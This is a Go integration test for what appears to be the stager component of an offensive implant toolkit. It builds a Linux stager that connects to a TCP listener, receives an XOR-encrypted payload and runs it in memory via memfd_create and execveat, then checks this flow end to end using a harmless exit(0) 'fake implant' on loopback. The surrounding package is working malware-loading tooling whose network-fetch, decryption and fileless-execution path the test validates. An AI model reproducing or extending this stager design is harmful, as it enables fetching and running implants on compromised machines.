package stager

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/exec"
	"testing"
	"time"
)

// makeExitELF builds a minimal static ELF64 that just does exit(0).
// This is our "fake implant" for testing - if execveat works, process exits 0.
func makeExitELF() []byte {
	// Shellcode: mov eax, 60; xor edi, edi; syscall (exit(0))
	sc := []byte{0xb8, 0x3c, 0x00, 0x00, 0x00, 0x31, 0xff, 0x0f, 0x05}
	return makeELF64Wrapper(62)(sc)
}

func TestIntegrationX64(t *testing.T) {
	if os.Getenv("STAGER_INTEGRATION") == "" {
		t.Skip("set STAGER_INTEGRATION=1 to run")
	}

	// 1. Generate stager
	res, err := Generate("linux", "amd64", "127.0.0.1", 14444)
	if err != nil {
		t.Fatalf("Generate: %v", err)
	}
	t.Logf("stager: %d bytes, xor key: %x", len(res.Binary), res.XORKey)

	// 2. Write stager to temp file
	stagerPath := t.TempDir() + "/stager"
	if err := os.WriteFile(stagerPath, res.Binary, 0755); err != nil {
		t.Fatalf("write stager: %v", err)
	}

	// 3. Prepare fake implant (exit(0) ELF)
	implant := makeExitELF()
	t.Logf("fake implant: %d bytes", len(implant))

	// 4. Start TCP listener with XOR encryption
	ln, err := net.Listen("tcp", "127.0.0.1:14444")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer ln.Close()

	connected := make(chan bool, 1)
	go func() {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		defer conn.Close()
		connected <- true

		// Send XOR-encrypted size
		sizeBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(sizeBuf, uint32(len(implant)))
		XOREncrypt(sizeBuf, res.XORKey)
		conn.Write(sizeBuf)

		// Send XOR-encrypted payload
		payload := make([]byte, len(implant))
		copy(payload, implant)
		XOREncrypt(payload, res.XORKey)
		conn.Write(payload)

		// Give the stager time to write+exec
		time.Sleep(2 * time.Second)
	}()

	// 5. Run stager
	cmd := exec.Command(stagerPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		t.Fatalf("start stager: %v", err)
	}

	// 6. Wait for connection
	select {
	case <-connected:
		t.Log("stager connected to listener")
	case <-time.After(5 * time.Second):
		cmd.Process.Kill()
		t.Fatal("stager did not connect within 5s")
	}

	// 7. Wait for stager to finish
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	select {
	case err := <-done:
		if err != nil {
			// The parent fork exits with 1 (our exit(1) path), that's expected.
			// The child should have exec'd the fake implant which exits 0.
			// Since fork returns in parent with child pid != 0, parent hits exit(1).
			t.Logf("stager parent exited: %v (expected - parent fork exits)", err)
		} else {
			t.Log("stager exited cleanly")
		}
	case <-time.After(10 * time.Second):
		cmd.Process.Kill()
		t.Fatal("stager did not exit within 10s")
	}

	// If we got a connection, the TCP flow works.
	// The memfd_create+execveat may or may not work depending on kernel config,
	// but the network + XOR decryption path is validated.
	fmt.Println("integration test passed: connect + xor-encrypted staging OK")
}
